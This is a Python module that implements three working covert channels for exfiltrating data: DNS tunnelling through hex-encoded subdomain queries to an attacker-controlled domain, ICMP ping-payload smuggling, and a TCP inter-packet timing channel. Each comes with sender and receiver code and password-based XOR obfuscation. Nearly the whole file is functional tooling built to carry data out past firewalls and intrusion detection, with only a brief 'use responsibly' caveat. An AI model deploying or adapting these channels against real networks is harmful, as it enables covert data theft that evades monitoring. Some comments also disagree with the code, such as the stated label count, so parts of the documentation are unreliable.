"""
Network Covert Channels — DNS, ICMP, and TCP Timing

Three network-based data exfiltration/communication channels:

1. **DNS Tunnelling**
   Encodes payload data as DNS query labels (subdomain names).
   Each query carries up to ~60 bytes of payload encoded as hex
   subdomains.  Looks like normal DNS traffic to most firewalls.

2. **ICMP Payload Channel**
   Hides data in the payload section of ICMP Echo Request (ping)
   packets.  The padding bytes carry the actual covert payload.
   Requires raw socket privileges (root/CAP_NET_RAW).

3. **TCP Timing Channel**
   Modulates inter-packet timing to encode bits.  A short delay
   encodes '0', a long delay encodes '1'.  Extremely hard to detect
   but very low bandwidth (~10 bits/second).

Security Note
-------------
These channels require network access and may trigger IDS/IPS alerts
depending on the network environment.  Use responsibly.
"""

import socket
import struct
import time
import base64
import hashlib
import os
from typing import Optional, List, Tuple


# ═══════════════════════════════════════════════════════════════════════════
#  DNS Tunnelling
# ═══════════════════════════════════════════════════════════════════════════

class DNSTunnel:
    """
    DNS-based covert channel using subdomain label encoding.
    
    Encodes payload bytes as hexadecimal subdomain labels in DNS queries.
    Each DNS query can carry up to 63 chars per label × up to 4 labels
    ≈ 120 hex chars ≈ 60 payload bytes per query.
    
    Parameters
    ----------
    domain : str
        The base domain to tunnel under (e.g. "example.com").
        You must control the authoritative DNS for this domain
        to receive the data.
    dns_server : str
        DNS server IP to send queries to. Default: "8.8.8.8".
    dns_port : int
        DNS server port. Default: 53.
    """
    
    MAX_LABEL_LEN = 60  # DNS label limit is 63, leave margin
    MAX_LABELS = 3       # Up to 3 data labels per query
    
    def __init__(self, domain: str, dns_server: str = "8.8.8.8",
                 dns_port: int = 53):
        self.domain = domain
        self.dns_server = dns_server
        self.dns_port = dns_port
    
    def _build_dns_query(self, labels: list, query_id: int = 0) -> bytes:
        """
        Build a raw DNS query packet.
        
        Format: Header (12B) + Question section
        """
        # Header
        txn_id = query_id & 0xFFFF
        flags = 0x0100  # Standard query, recursion desired
        qdcount = 1
        header = struct.pack(">HHHHHH", txn_id, flags, qdcount, 0, 0, 0)
        
        # Question: encode labels
        qname = b""
        for label in labels:
            encoded = label.encode('ascii')
            if len(encoded) > 63:
                encoded = encoded[:63]
            qname += struct.pack("B", len(encoded)) + encoded
        
        # Add base domain labels
        for part in self.domain.split('.'):
            encoded = part.encode('ascii')
            qname += struct.pack("B", len(encoded)) + encoded
        
        qname += b'\x00'  # Root label
        
        # QTYPE=TXT (16), QCLASS=IN (1)
        question = qname + struct.pack(">HH", 16, 1)
        
        return header + question
    
    def _parse_dns_response(self, data: bytes) -> Optional[str]:
        """Parse a DNS response and extract TXT record data."""
        if len(data) < 12:
            return None
        
        # Skip header
        ancount = struct.unpack(">H", data[6:8])[0]
        
        if ancount == 0:
            return None
        
        # Skip question section (find the answer section)
        offset = 12
        # Skip QNAME
        while offset < len(data) and data[offset] != 0:
            if data[offset] & 0xC0 == 0xC0:  # Pointer
                offset += 2
                break
            else:
                offset += 1 + data[offset]
        else:
            offset += 1  # Skip null terminator
        
        offset += 4  # Skip QTYPE + QCLASS
        
        # Parse answer(s)
        for _ in range(ancount):
            if offset >= len(data):
                break
            
            # Skip NAME (might be pointer)
            if data[offset] & 0xC0 == 0xC0:
                offset += 2
            else:
                while offset < len(data) and data[offset] != 0:
                    offset += 1 + data[offset]
                offset += 1
            
            if offset + 10 > len(data):
                break
            
            rtype = struct.unpack(">H", data[offset:offset+2])[0]
            rdlength = struct.unpack(">H", data[offset+8:offset+10])[0]
            offset += 10
            
            if rtype == 16 and offset + rdlength <= len(data):  # TXT
                # TXT record: first byte is string length
                txt_len = data[offset]
                txt_data = data[offset+1:offset+1+txt_len]
                return txt_data.decode('ascii', errors='ignore')
            
            offset += rdlength
        
        return None
    
    def send_payload(self, payload: bytes, password: str = "") -> dict:
        """
        Send payload via DNS tunnel.
        
        Splits payload into chunks and sends each as a DNS query
        with hex-encoded subdomain labels.
        
        Parameters
        ----------
        payload : bytes
            Data to exfiltrate.
        password : str
            Optional password for XOR obfuscation of the hex labels.
        
        Returns
        -------
        dict with statistics about the transmission.
        """
        # XOR obfuscation with password-derived key stream
        if password:
            key = hashlib.sha256(password.encode()).digest()
            obfuscated = bytes(
                payload[i] ^ key[i % len(key)] for i in range(len(payload))
            )
        else:
            obfuscated = payload
        
        # Encode as hex
        hex_data = obfuscated.hex()
        
        # Split into chunks that fit DNS labels
        chunk_size = self.MAX_LABEL_LEN * self.MAX_LABELS
        chunks = [
            hex_data[i:i+chunk_size]
            for i in range(0, len(hex_data), chunk_size)
        ]
        
        # Prepend length header as first query
        length_hex = struct.pack("<I", len(payload)).hex()
        total_chunks = len(chunks)
        meta_hex = struct.pack("<I", total_chunks).hex()
        
        all_queries = [length_hex + meta_hex] + chunks
        
        stats = {
            "total_queries": len(all_queries),
            "total_bytes": len(payload),
            "queries_sent": 0,
            "errors": []
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5.0)
            
            for idx, chunk in enumerate(all_queries):
                # Split chunk into DNS labels
                labels = [
                    f"d{idx:04x}" + chunk[j:j+self.MAX_LABEL_LEN]
                    for j in range(0, len(chunk), self.MAX_LABEL_LEN)
                ]
                
                if not labels:
                    labels = [f"d{idx:04x}"]
                
                query = self._build_dns_query(labels, query_id=idx)
                
                try:
                    sock.sendto(query, (self.dns_server, self.dns_port))
                    stats["queries_sent"] += 1
                    
                    # Small delay to avoid flooding
                    time.sleep(0.05)
                except Exception as e:
                    stats["errors"].append(f"Query {idx}: {e}")
            
            sock.close()
        except Exception as e:
            stats["errors"].append(f"Socket error: {e}")
        
        return stats
    
    def receive_payload(self, timeout: float = 30.0,
                       password: str = "") -> Optional[bytes]:
        """
        Listen for incoming DNS tunnel queries and reconstruct payload.
        
        This must be run on the authoritative DNS server for the domain.
        
        Parameters
        ----------
        timeout : float
            How long to listen for queries (seconds).
        password : str
            Same password used during sending.
        
        Returns
        -------
        bytes or None
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", self.dns_port))
            sock.settimeout(timeout)
        except PermissionError:
            raise PermissionError(
                "DNS listener requires root/CAP_NET_BIND_SERVICE to bind port 53."
            )
        
        chunks = {}
        payload_len = None
        total_chunks = None
        start_time = time.time()
        
        try:
            while time.time() - start_time < timeout:
                try:
                    data, addr = sock.recvfrom(4096)
                except socket.timeout:
                    break
                
                if len(data) < 12:
                    continue
                
                # Parse the query labels
                offset = 12
                labels = []
                while offset < len(data) and data[offset] != 0:
                    if data[offset] & 0xC0 == 0xC0:
                        offset += 2
                        break
                    label_len = data[offset]
                    offset += 1
                    label = data[offset:offset+label_len].decode('ascii', errors='ignore')
                    labels.append(label)
                    offset += label_len
                
                # Extract data from labels (strip domain labels)
                domain_parts = self.domain.split('.')
                data_labels = labels[:len(labels) - len(domain_parts)]
                
                if not data_labels:
                    continue
                
                # First label starts with chunk index (dXXXX)
                first = data_labels[0]
                if first.startswith('d') and len(first) >= 5:
                    chunk_idx = int(first[1:5], 16)
                    hex_data = first[5:] + ''.join(data_labels[1:])
                    
                    if chunk_idx == 0 and payload_len is None:
                        # Meta chunk
                        try:
                            meta_bytes = bytes.fromhex(hex_data[:16])
                            payload_len = struct.unpack("<I", meta_bytes[:4])[0]
                            total_chunks = struct.unpack("<I", meta_bytes[4:8])[0]
                        except Exception:
                            continue
                    else:
                        chunks[chunk_idx] = hex_data
                
                if total_chunks and len(chunks) >= total_chunks:
                    break
        finally:
            sock.close()
        
        if not chunks or payload_len is None:
            return None
        
        # Reconstruct
        full_hex = ''.join(chunks.get(i+1, '') for i in range(total_chunks or len(chunks)))
        
        try:
            raw_bytes = bytes.fromhex(full_hex)
        except ValueError:
            return None
        
        if password:
            key = hashlib.sha256(password.encode()).digest()
            raw_bytes = bytes(
                raw_bytes[i] ^ key[i % len(key)] for i in range(len(raw_bytes))
            )
        
        return raw_bytes[:payload_len]


# ═══════════════════════════════════════════════════════════════════════════
#  ICMP Payload Channel
# ═══════════════════════════════════════════════════════════════════════════

class ICMPChannel:
    """
    ICMP-based covert channel using Echo Request payload bytes.
    
    Hides data in the padding section of ICMP ping packets.
    Requires raw socket privileges (root or CAP_NET_RAW).
    
    Parameters
    ----------
    target_host : str
        IP address of the receiving host.
    """
    
    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    MAX_PAYLOAD_PER_PACKET = 1400  # Stay well under MTU
    
    def __init__(self, target_host: str):
        self.target_host = target_host
    
    @staticmethod
    def _checksum(data: bytes) -> int:
        """Compute ICMP checksum."""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i + 1]
        
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        
        return (~total) & 0xFFFF
    
    def _build_icmp_packet(self, payload: bytes, seq: int = 0,
                           ident: int = 0xAEE5) -> bytes:
        """Build a raw ICMP Echo Request packet."""
        icmp_type = self.ICMP_ECHO_REQUEST
        icmp_code = 0
        checksum = 0
        
        header = struct.pack(">BBHHH", icmp_type, icmp_code, checksum,
                           ident, seq)
        
        packet = header + payload
        checksum = self._checksum(packet)
        
        header = struct.pack(">BBHHH", icmp_type, icmp_code, checksum,
                           ident, seq)
        
        return header + payload
    
    def send_payload(self, payload: bytes, password: str = "") -> dict:
        """
        Send payload via ICMP echo requests.
        
        The payload is split across multiple ping packets.
        
        Returns dict with transmission statistics.
        """
        # XOR obfuscation
        if password:
            key = hashlib.sha256(password.encode()).digest()
            obfuscated = bytes(
                payload[i] ^ key[i % len(key)] for i in range(len(payload))
            )
        else:
            obfuscated = payload
        
        # Prepend length header
        full_data = struct.pack("<I", len(payload)) + obfuscated
        
        # Split into chunks
        chunks = [
            full_data[i:i+self.MAX_PAYLOAD_PER_PACKET]
            for i in range(0, len(full_data), self.MAX_PAYLOAD_PER_PACKET)
        ]
        
        stats = {
            "total_packets": len(chunks),
            "total_bytes": len(payload),
            "packets_sent": 0,
            "errors": []
        }
        
        try:
            sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP
            )
            sock.settimeout(5.0)
        except PermissionError:
            raise PermissionError(
                "ICMP channel requires root/CAP_NET_RAW privileges."
            )
        
        try:
            for seq, chunk in enumerate(chunks):
                packet = self._build_icmp_packet(chunk, seq=seq)
                
                try:
                    sock.sendto(packet, (self.target_host, 0))
                    stats["packets_sent"] += 1
                    time.sleep(0.1)  # Avoid ICMP rate limiting
                except Exception as e:
                    stats["errors"].append(f"Packet {seq}: {e}")
        finally:
            sock.close()
        
        return stats
    
    def receive_payload(self, timeout: float = 30.0,
                       password: str = "") -> Optional[bytes]:
        """
        Listen for ICMP echo requests carrying covert payload.
        
        Returns reconstructed payload or None.
        """
        try:
            sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP
            )
            sock.settimeout(timeout)
        except PermissionError:
            raise PermissionError(
                "ICMP listener requires root/CAP_NET_RAW privileges."
            )
        
        chunks = {}
        start_time = time.time()
        payload_len = None
        
        try:
            while time.time() - start_time < timeout:
                try:
                    data, addr = sock.recvfrom(4096)
                except socket.timeout:
                    break
                
                # Skip IP header (20 bytes typically)
                if len(data) < 28:
                    continue
                
                ip_header_len = (data[0] & 0x0F) * 4
                icmp_data = data[ip_header_len:]
                
                if len(icmp_data) < 8:
                    continue
                
                icmp_type = icmp_data[0]
                ident = struct.unpack(">H", icmp_data[4:6])[0]
                seq = struct.unpack(">H", icmp_data[6:8])[0]
                
                if icmp_type != self.ICMP_ECHO_REQUEST or ident != 0xAEE5:
                    continue
                
                payload_data = icmp_data[8:]
                chunks[seq] = payload_data
                
                # Try to read length from first chunk
                if 0 in chunks and payload_len is None:
                    if len(chunks[0]) >= 4:
                        payload_len = struct.unpack("<I", chunks[0][:4])[0]
                
                # Check if we have all data
                if payload_len is not None:
                    total_data = b""
                    for i in range(len(chunks)):
                        if i in chunks:
                            total_data += chunks[i]
                    
                    if len(total_data) >= 4 + payload_len:
                        break
        finally:
            sock.close()
        
        if not chunks:
            return None
        
        # Reconstruct
        full_data = b""
        for i in sorted(chunks.keys()):
            full_data += chunks[i]
        
        if len(full_data) < 4:
            return None
        
        payload_len = struct.unpack("<I", full_data[:4])[0]
        raw = full_data[4:4 + payload_len]
        
        if password:
            key = hashlib.sha256(password.encode()).digest()
            raw = bytes(raw[i] ^ key[i % len(key)] for i in range(len(raw)))
        
        return raw


# ═══════════════════════════════════════════════════════════════════════════
#  TCP Timing Channel
# ═══════════════════════════════════════════════════════════════════════════

class TCPTimingChannel:
    """
    TCP timing-based covert channel.
    
    Encodes bits using inter-packet timing:
      - Short delay (bit_0_delay ms) → bit '0'
      - Long delay  (bit_1_delay ms) → bit '1'
    
    Very low bandwidth (~10 bits/sec) but extremely hard to detect
    without precise timing analysis.
    
    Parameters
    ----------
    host : str
        Target host IP.
    port : int
        Target TCP port.
    bit_0_delay : float
        Delay in seconds for bit '0'. Default: 0.05 (50ms).
    bit_1_delay : float
        Delay in seconds for bit '1'. Default: 0.15 (150ms).
    """
    
    def __init__(self, host: str, port: int,
                 bit_0_delay: float = 0.05,
                 bit_1_delay: float = 0.15):
        self.host = host
        self.port = port
        self.bit_0_delay = bit_0_delay
        self.bit_1_delay = bit_1_delay
        self.threshold = (bit_0_delay + bit_1_delay) / 2.0
    
    def send_payload(self, payload: bytes) -> dict:
        """
        Send payload by modulating TCP packet timing.
        
        Each byte is sent as 8 individual timing-encoded bits.
        A synchronisation preamble (0xAA 0xAA) is sent first.
        """
        # Convert to bit stream
        import numpy as np
        
        # Preamble + length + data
        preamble = b'\xAA\xAA'
        length_bytes = struct.pack("<I", len(payload))
        full_data = preamble + length_bytes + payload
        
        bits = np.unpackbits(np.frombuffer(full_data, dtype=np.uint8))
        
        stats = {
            "total_bits": len(bits),
            "total_bytes": len(payload),
            "bits_sent": 0,
            "estimated_time_seconds": len(bits) * (self.bit_0_delay + self.bit_1_delay) / 2,
            "errors": []
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10.0)
            sock.connect((self.host, self.port))
        except Exception as e:
            stats["errors"].append(f"Connection failed: {e}")
            return stats
        
        try:
            for bit in bits:
                # Send a single byte (the actual data is in the timing)
                try:
                    sock.send(b'\x00')
                    delay = self.bit_1_delay if bit else self.bit_0_delay
                    time.sleep(delay)
                    stats["bits_sent"] += 1
                except Exception as e:
                    stats["errors"].append(f"Send error: {e}")
                    break
        finally:
            sock.close()
        
        return stats
    
    def receive_payload(self, timeout: float = 300.0) -> Optional[bytes]:
        """
        Listen for timing-encoded payload on TCP port.
        
        Measures inter-packet arrival times and decodes bits.
        """
        import numpy as np
        
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.port))
            server.listen(1)
            server.settimeout(timeout)
        except PermissionError:
            raise PermissionError(
                f"Cannot bind to port {self.port}. Use a port > 1024 or run as root."
            )
        
        try:
            conn, addr = server.accept()
            conn.settimeout(2.0)
        except socket.timeout:
            server.close()
            return None
        
        timings = []
        last_time = time.time()
        
        try:
            while True:
                try:
                    data = conn.recv(1)
                    if not data:
                        break
                    
                    current_time = time.time()
                    delta = current_time - last_time
                    timings.append(delta)
                    last_time = current_time
                    
                except socket.timeout:
                    if len(timings) > 48:  # At least preamble + length
                        break
                    continue
        finally:
            conn.close()
            server.close()
        
        if len(timings) < 48:
            return None
        
        # Decode timings to bits
        bits = []
        for t in timings[1:]:  # Skip first (connection timing)
            bits.append(1 if t > self.threshold else 0)
        
        if len(bits) < 48:
            return None
        
        # Pack bits to bytes
        bit_array = np.array(bits, dtype=np.uint8)
        byte_array = np.packbits(bit_array).tobytes()
        
        # Find preamble (0xAA 0xAA)
        preamble_idx = byte_array.find(b'\xAA\xAA')
        if preamble_idx < 0:
            return None
        
        data_start = preamble_idx + 2
        if data_start + 4 > len(byte_array):
            return None
        
        payload_len = struct.unpack("<I", byte_array[data_start:data_start+4])[0]
        
        if payload_len > 10 * 1024 * 1024:
            return None
        
        payload_start = data_start + 4
        if payload_start + payload_len > len(byte_array):
            return None
        
        return byte_array[payload_start:payload_start + payload_len]
